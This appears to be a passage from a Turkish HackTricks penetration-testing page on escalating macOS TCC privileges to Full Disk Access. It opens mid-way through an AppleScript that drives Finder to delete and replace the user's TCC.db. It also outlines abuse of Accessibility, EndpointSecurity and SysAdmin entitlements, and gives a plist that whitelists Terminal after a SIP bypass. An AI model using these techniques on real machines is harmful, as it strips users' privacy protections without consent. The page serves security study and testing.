    set homePath to system attribute "HOME"

    -- Navigate to the Desktop directory under $HOME
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke homePath & "/Library/Application Support/com.apple.TCC"
    delay 1
    keystroke return
    delay 1

    -- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
    keystroke "TCC.db"
    delay 1
    keystroke return
    delay 1
    key code 51 using {command down}
    delay 1

    -- Paste the file
    keystroke "v" using {command down}
end tell
EOF
```

### `kTCCServiceAccessibility` to FDA\*

Bu sayfada, FDA\*’ya privesc yapmak veya örneğin keylogger çalıştırmak için [**Accessibility izinlerini kötüye kullanmaya yönelik payload’lar**](macos-tcc-payloads.md#accessibility) bulabilirsiniz.

### **Endpoint Security Client to FDA**

**`kTCCServiceEndpointSecurityClient`** yetkiniz varsa FDA’ya sahipsiniz. Bitti.

### System Policy SysAdmin File to FDA

**`kTCCServiceSystemPolicySysAdminFiles`**, bir kullanıcının **`NFSHomeDirectory`** özniteliğini **değiştirmenize** olanak tanır; bu, kullanıcının ana klasörünü değiştirir ve dolayısıyla **TCC’yi bypass etmenizi** sağlar.<sup>[[5]](#references)</sup>

### User TCC DB to FDA

**Kullanıcı TCC** veritabanı üzerinde **yazma izinleri** elde etmek, kendinize **`FDA`** izinleri vermenizi **sağlamaz**; bunu yalnızca sistem veritabanında bulunan izinler sağlayabilir.

Ancak kendinize **`Finder için Automation hakları`** verebilir ve önceki tekniği kötüye kullanarak FDA\*’ya yükseltebilirsiniz.

### **FDA to TCC permissions**

**Full Disk Access**’in TCC adı **`kTCCServiceSystemPolicyAllFiles`**’tır.

Bunun gerçek bir privesc olduğunu düşünmüyorum, ancak yararlı bulabilirsiniz: FDA yetkisine sahip bir programı kontrol ediyorsanız **kullanıcının TCC veritabanını değiştirebilir ve kendinize istediğiniz erişimi verebilirsiniz**. FDA izinlerinizi kaybetme ihtimalinize karşı bu, kalıcılık tekniği olarak yararlı olabilir.

### **SIP Bypass to TCC Bypass**

Sistem **TCC veritabanı** **SIP** tarafından korunur; bu yüzden onu yalnızca **belirtilen entitlements’lara sahip işlemler değiştirebilir**. Dolayısıyla bir saldırgan bir **dosya** üzerinde **SIP bypass** bulursa (SIP tarafından kısıtlanan bir dosyayı değiştirebilirse), şunları yapabilir:

- TCC veritabanının **korumasını kaldırabilir** ve kendisine tüm TCC izinlerini verebilir. Örneğin şu dosyalardan herhangi birini kötüye kullanabilir:
  - TCC sistem veritabanı
  - REG.db
  - MDMOverrides.plist

Ancak bu **SIP bypass’ı TCC’yi bypass etmek için** kötüye kullanmanın başka bir yolu daha vardır: `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` dosyası, TCC istisnası gerektiren uygulamaların izin listesidir. Dolayısıyla bir saldırgan bu dosyanın **SIP korumasını kaldırabilir** ve **kendi uygulamasını** ekleyebilirse, uygulama TCC’yi bypass edebilir.\
Örneğin, terminal eklemek için:

```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```

AllowApplicationsList.plist:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Services</key>
	<dict>
		<key>SystemPolicyAllFiles</key>
		<array>
			<dict>
				<key>CodeRequirement</key>
				<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
				<key>IdentifierType</key>
				<string>bundleID</string>
				<key>Identifier</key>
				<string>com.apple.Terminal</string>
			</dict>
		</array>
	</dict>
</dict>
</plist>
```

### TCC Atlatmaları


{{#ref}}
macos-tcc-bypasses/
{{#endref}}



## References

- [1] [macOS TCC.db'ye derinlemesine bakış - Rainforest QA Blog](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - com.apple.macl'i izleme betiği (brunerd'ın Gist'i)](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [com.apple.macl'i izleme ve ele alma](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [macOS TCC Kullanıcı Gizliliği Korumalarını Yanlışlıkla ve Tasarım Gereği Atlatma](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [5] [Ana dizini değiştirme ve TCC'yi atlatma, diğer adıyla CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [6] [TCC'de SQL Injection: ve bunun (muhtemelen) neden bir güvenlik riski olmadığı (bu sefer)](https://wts.dev/posts/tcc-sql-injection/)
- [7] [macOS'ta TCC.db'nin konumu ve edinilmesi](https://www.tccparser.com/en/blog/tcc-db-location-acquisition)
- [8] [macOS Uygulama Sandbox'ını yapılandırma](https://developer.apple.com/documentation/xcode/configuring-the-macos-app-sandbox)
- [9] [Kamera yetkisi](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.device.camera)
- [10] [Apple aygıtları için Gizlilik Tercihleri İlkesi Denetimi aygıt yönetimi yükü ayarları](https://support.apple.com/guide/deployment/privacy-preferences-policy-control-payload-dep38df53c2a/web)
- [11] [Bir macOS saldırısının tuzaktan ihlale kadar incelenmesi](https://www.microsoft.com/en-us/security/blog/2026/04/16/dissecting-sapphire-sleets-macos-intrusion-from-lure-to-compromise/)
{{#include ../../../../banners/hacktricks-training.md}}
